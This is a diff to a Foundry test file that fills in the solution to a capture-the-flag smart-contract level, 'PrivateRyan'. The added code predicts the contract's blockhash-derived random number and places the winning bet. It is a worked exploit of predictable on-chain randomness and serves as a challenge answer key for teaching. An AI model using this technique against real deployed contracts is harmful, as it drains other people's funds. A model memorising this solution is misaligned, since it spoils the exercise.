@@ -8,16 +8,28 @@ import "src/02_PrivateRyan/PrivateRyan.sol";
 contract PrivateRyanTest is BaseTest {
     PrivateRyan instance;
 
+    uint256 constant CONTRACT_FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
+
     function setUp() public override {
         super.setUp();
-        instance = new PrivateRyan{value: 0.01 ether}();
         vm.roll(48743985);
+        instance = new PrivateRyan{value: 0.01 ether}();
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 newSeed = generateContractRandom(256, 48743984);
+        uint256 bet = generateContractRandom(100, 48743985 - newSeed);
+
+        instance.spin{value: 0.01 ether}(bet);
 
         checkSuccess();
+    }
+
+    function generateContractRandom(uint256 max, uint256 blockNumber) private view returns (uint256) {
+        uint256 factor = (CONTRACT_FACTOR * 100) / max;
+        uint256 hashVal = uint256(blockhash(blockNumber));
+
+        return uint256((uint256(hashVal) / factor)) % max;
     }
 
     function checkSuccess() internal view override {
